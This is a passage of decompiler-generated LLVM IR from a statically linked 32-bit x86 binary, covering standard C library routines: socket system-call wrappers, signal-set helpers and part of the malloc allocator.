dec_label_pc_8051d26:                             ; preds = %dec_label_pc_8051a70, %dec_label_pc_8051a69, %dec_label_pc_8051a25, %entry, %dec_label_pc_8051cfc, %dec_label_pc_8051bbe, %dec_label_pc_8051b18, %dec_label_pc_8051d21
  store i32 %v0_80519ff, i32* @ebx, align 4
  store i32 %v0_80519fe, i32* @esi, align 4
  store i32 %v0_80519fd, i32* @edi, align 4
  store i32 %v0_80519fc, i32* @ebp, align 4
  %v0_8051d2d = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8051d2d

; uselistorder directives
  uselistorder i32 %v2_8051b60, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_8051ae1, { 1, 0, 2 }
  uselistorder i32 %v1_8051ade, { 1, 0 }
  uselistorder i32 %v1_8051acb, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8051a94.pre, { 0, 2, 1 }
  uselistorder i32 %v1_8051a7f, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8051a5d, { 2, 0, 1, 3 }
  uselistorder i32* %v1_8051a5d, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_8051a0f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8051d26, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8051cfc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051a90, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8051d4b = ptrtoint i32* %stack_var_-12 to i32
  %v2_8051d52 = call i32 @__socketcall(i32 3, i32 %v2_8051d4b)
  ret i32 %v2_8051d52

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8051d77 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8051d7e = call i32 @__socketcall(i32 6, i32 %v2_8051d77)
  ret i32 %v2_8051d7e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8051db3 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8051dba = call i32 @__socketcall(i32 15, i32 %v2_8051db3)
  ret i32 %v2_8051dba

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8051de7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8051dee = call i32 @__socketcall(i32 10, i32 %v2_8051de7)
  ret i32 %v2_8051dee

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8051e1b = ptrtoint i32* %stack_var_-16 to i32
  %v2_8051e22 = call i32 @__socketcall(i32 9, i32 %v2_8051e1b)
  ret i32 %v2_8051e22

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8051e5f = ptrtoint i32* %stack_var_-24 to i32
  %v2_8051e66 = call i32 @__socketcall(i32 11, i32 %v2_8051e5f)
  ret i32 %v2_8051e66

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8051e9b = ptrtoint i32* %stack_var_-20 to i32
  %v2_8051ea2 = call i32 @__socketcall(i32 14, i32 %v2_8051e9b)
  ret i32 %v2_8051ea2

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8051ec7 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8051ece = call i32 @__socketcall(i32 1, i32 %v2_8051ec7)
  ret i32 %v2_8051ece

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 6, 0, 1, 3, 7, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8051ef0, label %dec_label_pc_8051ee3

dec_label_pc_8051ee3:                             ; preds = %entry
  %v1_8051ee3 = add i32 %arg1, -64
  %v3_8051ee3 = sub i32 63, %arg1
  %v4_8051ee3 = and i32 %v3_8051ee3, %arg1
  %v5_8051ee3 = icmp slt i32 %v4_8051ee3, 0
  %v6_8051ee3 = icmp eq i32 %v1_8051ee3, 0
  %v7_8051ee3 = icmp slt i32 %v1_8051ee3, 0
  %v3_8051ee6 = icmp eq i1 %v7_8051ee3, %v5_8051ee3
  %v4_8051ee6 = icmp eq i1 %v6_8051ee3, false
  %v5_8051ee6 = and i1 %v4_8051ee6, %v3_8051ee6
  br i1 %v5_8051ee6, label %dec_label_pc_8051ef0, label %dec_label_pc_8051ee8

dec_label_pc_8051ee8:                             ; preds = %dec_label_pc_8051ee3
  %v4_8051eeb = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8051ef0

dec_label_pc_8051ef0:                             ; preds = %dec_label_pc_8051ee3, %entry, %dec_label_pc_8051ee8
  %v1_8051ef0 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8051ef5 = inttoptr i32 %v1_8051ef0 to i32*
  store i32 22, i32* %v1_8051ef5, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8051ee3, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8051ef0, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8051f12 = inttoptr i32 %arg1 to i8*
  %v4_8051f12 = call i32 @__GI_memset(i8* %v3_8051f12, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8051f20 = load i32, i32* @ebx, align 4
  %v15_8051f21 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8051f35 = icmp eq i32 %arg2, -1
  br i1 %v10_8051f35, label %dec_label_pc_8051f43, label %dec_label_pc_8051f3a

dec_label_pc_8051f3a:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_8051f43, label %dec_label_pc_8051f3e

dec_label_pc_8051f3e:                             ; preds = %dec_label_pc_8051f3a
  %v7_8051f41 = icmp sgt i32 %arg1, 64
  br i1 %v7_8051f41, label %dec_label_pc_8051f43, label %dec_label_pc_8051f50

dec_label_pc_8051f43:                             ; preds = %dec_label_pc_8051f3e, %dec_label_pc_8051f3a, %entry
  %v1_8051f43 = call i32 @__errno_location(i32 %v0_8051f20)
  store i32 %v1_8051f43, i32* %eax.global-to-local, align 4
  %v1_8051f48 = inttoptr i32 %v1_8051f43 to i32*
  store i32 22, i32* %v1_8051f48, align 4
  br label %dec_label_pc_8051fc4

dec_label_pc_8051f50:                             ; preds = %dec_label_pc_8051f3e
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f5e

dec_label_pc_8051f5e:                             ; preds = %dec_label_pc_8051f5e.dec_label_pc_8051f5e_crit_edge, %dec_label_pc_8051f50
  %v0_8051f5e = phi i32 [ %v15_8051f21, %dec_label_pc_8051f50 ], [ %v0_8051f5e.pre, %dec_label_pc_8051f5e.dec_label_pc_8051f5e_crit_edge ]
  %v1_8051f6917 = phi i32 [ 31, %dec_label_pc_8051f50 ], [ %v1_8051f69, %dec_label_pc_8051f5e.dec_label_pc_8051f5e_crit_edge ]
  %v2_8051f5e = mul i32 %v1_8051f6917, 4
  %v3_8051f5e = add i32 %v2_8051f5e, 160
  %v4_8051f5e = add i32 %v3_8051f5e, %v0_8051f5e
  %v5_8051f5e = inttoptr i32 %v4_8051f5e to i32*
  store i32 0, i32* %v5_8051f5e, align 4
  %v0_8051f69.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8051f69 = add i32 %v0_8051f69.pre, -1
  %v9_8051f69 = icmp slt i32 %v1_8051f69, 0
  store i32 %v1_8051f69, i32* %eax.global-to-local, align 4
  %v1_8051f6a = icmp eq i1 %v9_8051f69, false
  br i1 %v1_8051f6a, label %dec_label_pc_8051f5e.dec_label_pc_8051f5e_crit_edge, label %dec_label_pc_8051f6c

dec_label_pc_8051f5e.dec_label_pc_8051f5e_crit_edge: ; preds = %dec_label_pc_8051f5e
  %v0_8051f5e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051f5e

dec_label_pc_8051f6c:                             ; preds = %dec_label_pc_8051f5e
  %v0_8051f6c = load i32, i32* @edx, align 4
  %v2_8051f6f = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8051f6f, i32* %eax.global-to-local, align 4
  %v4_8051f77 = call i32 @__sigaddset(i32 %v2_8051f6f, i32 %arg1, i32 %v0_8051f6c, i32 %v0_8051f6c)
  store i32 %v4_8051f77, i32* %eax.global-to-local, align 4
  %v2_8051f7f = icmp slt i32 %v4_8051f77, 0
  br i1 %v2_8051f7f, label %dec_label_pc_8051fc4, label %dec_label_pc_8051f83

dec_label_pc_8051f83:                             ; preds = %dec_label_pc_8051f6c
  %v4_8051f8b = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8067820.729 to i32), i32 %arg1, i32 %v4_8051f77, i32 %v4_8051f77)
  %v2_8051fa4 = ptrtoint i32* %stack_var_-284 to i32
  %v2_8051fa9 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8051fa9, i32* %eax.global-to-local, align 4
  %v4_8051fb2 = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8051fa4)
  store i32 %v4_8051fb2, i32* %eax.global-to-local, align 4
  %v2_8051fba = icmp slt i32 %v4_8051fb2, 0
  br i1 %v2_8051fba, label %dec_label_pc_8051fc4, label %dec_label_pc_8051fbe

dec_label_pc_8051fbe:                             ; preds = %dec_label_pc_8051f83
  %v3_8051fbe = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8051fc7

dec_label_pc_8051fc4:                             ; preds = %dec_label_pc_8051f83, %dec_label_pc_8051f6c, %dec_label_pc_8051f43
  br label %dec_label_pc_8051fc7

dec_label_pc_8051fc7:                             ; preds = %dec_label_pc_8051fbe, %dec_label_pc_8051fc4
  %storemerge = phi i32 [ -1, %dec_label_pc_8051fc4 ], [ %v3_8051fbe, %dec_label_pc_8051fbe ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8051f20, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8051f69, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_8051fc7, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8051fde = add i32 %arg2, -1
  %v1_8051fe1 = urem i32 %v1_8051fde, 32
  %v2_8051fe1 = icmp eq i32 %v1_8051fe1, 0
  %v2_8051fe4 = udiv i32 %v1_8051fde, 32
  br i1 %v2_8051fe1, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8051fe7 = shl i32 1, %v1_8051fe1
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8051fe9 = phi i32 [ 1, %entry ], [ %v5_8051fe7, %bb ]
  %v2_8051fe9 = mul nuw nsw i32 %v2_8051fe4, 4
  %v3_8051fe9 = add i32 %v2_8051fe9, %arg1
  %v4_8051fe9 = inttoptr i32 %v3_8051fe9 to i32*
  %v5_8051fe9 = load i32, i32* %v4_8051fe9, align 4
  %v7_8051fe9 = and i32 %v5_8051fe9, %v6_8051fe9
  %v8_8051fe9 = icmp eq i32 %v7_8051fe9, 0
  %v1_8051fed = icmp eq i1 %v8_8051fe9, false
  %v2_8051fed = zext i1 %v1_8051fed to i32
  ret i32 %v2_8051fed

; uselistorder directives
  uselistorder i32 %v1_8051fe1, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ff4 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ff4, i32* %stack_var_-4, align 4
  %v1_8052002 = add i32 %arg2, -1
  %v1_8052005 = urem i32 %v1_8052002, 32
  %v2_8052005 = icmp eq i32 %v1_8052005, 0
  store i32 %v1_8052005, i32* @ecx, align 4
  %v2_8052008 = udiv i32 %v1_8052002, 32
  store i32 %v2_8052008, i32* @edx, align 4
  br i1 %v2_8052005, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_805200b = shl i32 1, %v1_8052005
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_805200d = phi i32 [ 1, %entry ], [ %v5_805200b, %bb ]
  %v2_805200d = mul nuw nsw i32 %v2_8052008, 4
  %v3_805200d = add i32 %v2_805200d, %arg1
  %v4_805200d = inttoptr i32 %v3_805200d to i32*
  %v5_805200d = load i32, i32* %v4_805200d, align 4
  %v7_805200d = or i32 %v5_805200d, %v6_805200d
  store i32 %v7_805200d, i32* %v4_805200d, align 4
  %v2_8052012 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052012, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8052008, { 1, 0 }
  uselistorder i32 %v1_8052005, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8052022 = add i32 %arg2, -1
  %v1_8052025 = urem i32 %v1_8052022, 32
  %v2_8052025 = icmp eq i32 %v1_8052025, 0
  %v2_8052028 = udiv i32 %v1_8052022, 32
  br i1 %v2_8052025, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_805202b = shl i32 -2, %v1_8052025
  %v5_805202b = sub nsw i32 32, %v1_8052025
  %v6_805202b = lshr i32 -2, %v5_805202b
  %v7_805202b = or i32 %v6_805202b, %v4_805202b
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_805202d = phi i32 [ -2, %entry ], [ %v7_805202b, %bb ]
  %v2_805202d = mul nuw nsw i32 %v2_8052028, 4
  %v3_805202d = add i32 %v2_805202d, %arg1
  %v4_805202d = inttoptr i32 %v3_805202d to i32*
  %v5_805202d = load i32, i32* %v4_805202d, align 4
  %v7_805202d = and i32 %v5_805202d, %v6_805202d
  store i32 %v7_805202d, i32* %v4_805202d, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8052025, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_8052034 = load i32, i32* @eax, align 4
  %v6_8052047 = icmp ugt i32 %v0_8052034, 16777215
  br i1 %v6_8052047, label %dec_label_pc_8052058, label %dec_label_pc_8052049

dec_label_pc_8052049:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_8052034, 256
  %v2_8052037 = udiv i32 %v0_8052034, 256
  %v2_8052049 = call i32 @llvm.ctlz.i32(i32 %v2_8052037, i1 true)
  %v3_8052049 = xor i32 %v2_8052049, 31
  %v5_8052049 = select i1 %tmp, i32 95, i32 %v3_8052049
  %v1_805204c = add nuw nsw i32 %v5_8052049, 6
  store i32 %v1_805204c, i32* @ecx, align 4
  %v2_805204f = urem i32 %v1_805204c, 32
  %v4_805204f = icmp eq i32 %v2_805204f, 0
  br i1 %v4_805204f, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8052049
  %v5_805204f = lshr i32 %v0_8052034, %v2_805204f
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8052049, %bb
  %v0_8052051 = phi i32 [ %v0_8052034, %dec_label_pc_8052049 ], [ %v5_805204f, %bb ]
  %v1_8052051 = urem i32 %v0_8052051, 4
  %v2_8052054 = mul nuw nsw i32 %v5_8052049, 4
  %v3_8052054 = or i32 %v1_8052051, 32
  %v4_8052054 = add nuw nsw i32 %v3_8052054, %v2_8052054
  br label %dec_label_pc_8052058

dec_label_pc_8052058:                             ; preds = %entry, %bb4
  %v0_8052059 = phi i32 [ 95, %entry ], [ %v4_8052054, %bb4 ]
  ret i32 %v0_8052059

; uselistorder directives
  uselistorder i32 %v2_805204f, { 1, 0 }
  uselistorder i32 %v0_8052034, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8052058, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805205a = load i32, i32* @ebp, align 4
  %v0_805205b = load i32, i32* @edi, align 4
  %v0_805205c = load i32, i32* @esi, align 4
  %v0_805205d = load i32, i32* @ebx, align 4
  store i32 %v0_805205d, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_805206f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805206f, i32* @eax, align 4
  store i32 %v2_805206f, i32* %stack_var_-92, align 4
  %v2_8052074 = call i32 @__pthread_return_void(i32 %v2_805206f, i32 134560279)
  store i32 %v2_8052074, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8061430.730 to i32), i32* %stack_var_-92, align 4
  %v1_8052080 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061430.730 to i32))
  store i32 %v1_8052080, i32* %eax.global-to-local, align 4
  %v0_8052088 = load i32, i32* %ebx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_8052088, -32
  br i1 %tmp125, label %dec_label_pc_805209f, label %dec_label_pc_805208d

dec_label_pc_805208d:                             ; preds = %entry
  %v0_805208d = load i32, i32* %stack_var_-92, align 4
  %v1_805208d = call i32 @__errno_location(i32 %v0_805208d)
  store i32 %v1_805208d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8052094 = inttoptr i32 %v1_805208d to i32*
  store i32 12, i32* %v1_8052094, align 4
  br label %dec_label_pc_80527c4

dec_label_pc_805209f:                             ; preds = %entry
  %v1_805209f = add i32 %v0_8052088, 11
  %tmp126 = icmp ult i32 %v1_805209f, 16
  br i1 %tmp126, label %dec_label_pc_80520b6, label %dec_label_pc_80520af

dec_label_pc_80520af:                             ; preds = %dec_label_pc_805209f
  %v1_80520af = and i32 %v1_805209f, -8
  br label %dec_label_pc_80520b6

dec_label_pc_80520b6:                             ; preds = %dec_label_pc_805209f, %dec_label_pc_80520af
  %storemerge136 = phi i32 [ %v1_80520af, %dec_label_pc_80520af ], [ %v1_805209f, %dec_label_pc_805209f ]
  %v1_805244e = phi i32 [ %v1_80520af, %dec_label_pc_80520af ], [ 16, %dec_label_pc_805209f ]
  store i32 %storemerge136, i32* %eax.global-to-local, align 4
  %v0_80520b6 = load i8, i8* @global_var_80678a0.731, align 1
  %v1_80520b6 = sext i8 %v0_80520b6 to i32
  store i32 %v1_80520b6, i32* @ebx, align 4
  %v3_80520bc = urem i8 %v0_80520b6, 2
  %v4_80520bc = icmp eq i8 %v3_80520bc, 0
  %v1_80520bf = icmp eq i1 %v4_80520bc, false
  br i1 %v1_80520bf, label %dec_label_pc_80520de, label %dec_label_pc_80520c1

dec_label_pc_80520c1:                             ; preds = %dec_label_pc_80520b6
  %v2_80520c1 = icmp eq i8 %v0_80520b6, 0
  %v1_80520c3 = icmp eq i1 %v2_80520c1, false
  br i1 %v1_80520c3, label %dec_label_pc_80523b9, label %dec_label_pc_80520c9

dec_label_pc_80520c9:                             ; preds = %dec_label_pc_80520c1
  store i32 ptrtoint (i8* @global_var_80678a0.731 to i32), i32* %stack_var_-92, align 4
  %v2_80520d1 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80678a0.731 to i32*))
  store i32 %v2_80520d1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80523b9

dec_label_pc_80520de:                             ; preds = %dec_label_pc_80520b6
  %v11_80520de = trunc i32 %v1_805244e to i8
  %v8_80520e2 = icmp ugt i8 %v11_80520de, %v0_80520b6
  br i1 %v8_80520e2, label %dec_label_pc_80520ff, label %dec_label_pc_80520e4

dec_label_pc_80520e4:                             ; preds = %dec_label_pc_80520de
  %v2_80520e8 = udiv i32 %v1_805244e, 2
  store i32 %v2_80520e8, i32* %eax.global-to-local, align 4
  %v1_80520ea = add i32 %v2_80520e8, ptrtoint (i8* @global_var_80678a0.731 to i32)
  store i32 %v1_80520ea, i32* @ecx, align 4
  %v1_80520f0 = add i32 %v2_80520e8, add (i32 ptrtoint (i8* @global_var_80678a0.731 to i32), i32 -4)
  %v2_80520f0 = inttoptr i32 %v1_80520f0 to i32*
  %v3_80520f0 = load i32, i32* %v2_80520f0, align 4
  store i32 %v3_80520f0, i32* @edx, align 4
  %v1_80520f3 = icmp eq i32 %v3_80520f0, 0
  br i1 %v1_80520f3, label %dec_label_pc_80520ff, label %dec_label_pc_80520f7

dec_label_pc_80520f7:                             ; preds = %dec_label_pc_80520e4
  %v1_80520f7 = add i32 %v3_80520f0, 8
  %v2_80520f7 = inttoptr i32 %v1_80520f7 to i32*
  %v3_80520f7 = load i32, i32* %v2_80520f7, align 4
  store i32 %v3_80520f7, i32* %eax.global-to-local, align 4
  store i32 %v3_80520f7, i32* %v2_80520f0, align 4
  br label %dec_label_pc_8052138

dec_label_pc_80520ff:                             ; preds = %dec_label_pc_80520e4, %dec_label_pc_80520de
  %v8_80520ff = icmp ult i32 %v1_805244e, 255
  %v6_8052107 = icmp ugt i32 %v1_805244e, 255
  store i32 %v1_805244e, i32* @eax, align 4
  br i1 %v6_8052107, label %dec_label_pc_8052140, label %dec_label_pc_8052109

dec_label_pc_8052109:                             ; preds = %dec_label_pc_80520ff
  %v2_805210d = udiv i32 %v1_805244e, 8
  store i32 %v2_805210d, i32* %eax.global-to-local, align 4
  %v1_8052114 = mul nuw i32 %v2_805210d, 8
  %v2_8052114 = add i32 %v1_8052114, ptrtoint (i32* @global_var_80678cc.732 to i32)
  store i32 %v2_8052114, i32* @ecx, align 4
  %v1_805211b = add i32 %v1_8052114, add (i32 ptrtoint (i32* @global_var_80678cc.732 to i32), i32 12)
  %v2_805211b = inttoptr i32 %v1_805211b to i32*
  %v3_805211b = load i32, i32* %v2_805211b, align 4
  store i32 %v3_805211b, i32* @edx, align 4
  %v12_805211e = icmp eq i32 %v3_805211b, %v2_8052114
  br i1 %v12_805211e, label %dec_label_pc_805223c.preheader, label %dec_label_pc_8052126

dec_label_pc_8052126:                             ; preds = %dec_label_pc_8052109
  store i32 %v1_805244e, i32* %ebx.global-to-local, align 4
  %v1_805212a = add i32 %v3_805211b, 12
  %v2_805212a = inttoptr i32 %v1_805212a to i32*
  %v3_805212a = load i32, i32* %v2_805212a, align 4
  store i32 %v3_805212a, i32* %eax.global-to-local, align 4
  store i32 %v3_805212a, i32* %v2_805211b, align 4
  %v0_8052130 = load i32, i32* @edx, align 4
  %v1_8052130 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052130 = add i32 %v0_8052130, 4
  %v3_8052130 = add i32 %v2_8052130, %v1_8052130
  %v4_8052130 = inttoptr i32 %v3_8052130 to i32*
  %v5_8052130 = load i32, i32* %v4_8052130, align 4
  %v6_8052130 = or i32 %v5_8052130, 1
  store i32 %v6_8052130, i32* %v4_8052130, align 4
  %v0_8052135 = load i32, i32* @ecx, align 4
  %v1_8052135 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052135 = add i32 %v1_8052135, 8
  %v3_8052135 = inttoptr i32 %v2_8052135 to i32*
  store i32 %v0_8052135, i32* %v3_8052135, align 4
  br label %dec_label_pc_8052138

dec_label_pc_8052138:                             ; preds = %dec_label_pc_80524d5, %dec_label_pc_80524e7, %dec_label_pc_80520f7, %dec_label_pc_8052126
  %v0_8052138 = load i32, i32* @edx, align 4
  %v1_8052138 = add i32 %v0_8052138, 8
  store i32 %v1_8052138, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80527b3

dec_label_pc_8052140:                             ; preds = %dec_label_pc_80520ff
  %v0_8052144 = call i32 @__malloc_largebin_index()
  store i32 %v0_8052144, i32* %eax.global-to-local, align 4
  %v3_8052149 = and i8 %v0_80520b6, 2
  %v4_8052149 = icmp eq i8 %v3_8052149, 0
  %v6_8052149 = zext i8 %v3_8052149 to i32
  %v9_8052149 = and i32 %v1_80520b6, -256
  %v10_8052149 = or i32 %v9_8052149, %v6_8052149
  store i32 %v10_8052149, i32* @ebx, align 4
  br i1 %v4_8052149, label %dec_label_pc_805223c.preheader, label %dec_label_pc_8052156

dec_label_pc_8052156:                             ; preds = %dec_label_pc_8052140
  store i32 ptrtoint (i8* @global_var_80678a0.731 to i32), i32* %stack_var_-92, align 4
  %v2_805215e = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80678a0.731 to i32*))
  store i32 %v2_805215e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805223c.preheader

dec_label_pc_805223c.preheader:                   ; preds = %dec_label_pc_8052156, %dec_label_pc_8052109, %dec_label_pc_8052140
  %stack_var_-40.0.ph = phi i32 [ %v2_805210d, %dec_label_pc_8052109 ], [ %v0_8052144, %dec_label_pc_8052156 ], [ %v0_8052144, %dec_label_pc_8052140 ]
  %v1_8052192 = add i32 %v1_805244e, 16
  %v0_805223c107 = load i32, i32* @global_var_80678e0.735, align 32
  store i32 %v0_805223c107, i32* @ebp, align 4
  %v9_8052242109 = icmp eq i32 %v0_805223c107, 134641876
  %v1_8052248110 = icmp eq i1 %v9_8052242109, false
  br i1 %v1_8052248110, label %dec_label_pc_805216b, label %dec_label_pc_805224e

dec_label_pc_805216b:                             ; preds = %dec_label_pc_805223c.preheader, %bb84
  %v0_805223c111 = phi i32 [ %v0_805223c, %bb84 ], [ %v0_805223c107, %dec_label_pc_805223c.preheader ]
  %v1_805216b = add i32 %v0_805223c111, 4
  %v2_805216b = inttoptr i32 %v1_805216b to i32*
  %v3_805216b = load i32, i32* %v2_805216b, align 4
  %v1_805216e = add i32 %v0_805223c111, 12
  %v2_805216e = inttoptr i32 %v1_805216e to i32*
  %v3_805216e = load i32, i32* %v2_805216e, align 4
  store i32 %v3_805216e, i32* @edx, align 4
  %v1_8052171 = and i32 %v3_805216b, -4
  store i32 %v1_8052171, i32* @edi, align 4
  br i1 %v6_8052107, label %dec_label_pc_805219d, label %dec_label_pc_805217e

dec_label_pc_805217e:                             ; preds = %dec_label_pc_805216b
  %v9_805217e = icmp eq i32 %v3_805216e, 134641876
  %v1_8052184 = icmp eq i1 %v9_805217e, false
  br i1 %v1_8052184, label %dec_label_pc_805219d, label %dec_label_pc_8052186

dec_label_pc_8052186:                             ; preds = %dec_label_pc_805217e
  %v1_8052186 = load i32, i32* @global_var_80678d0.733, align 16
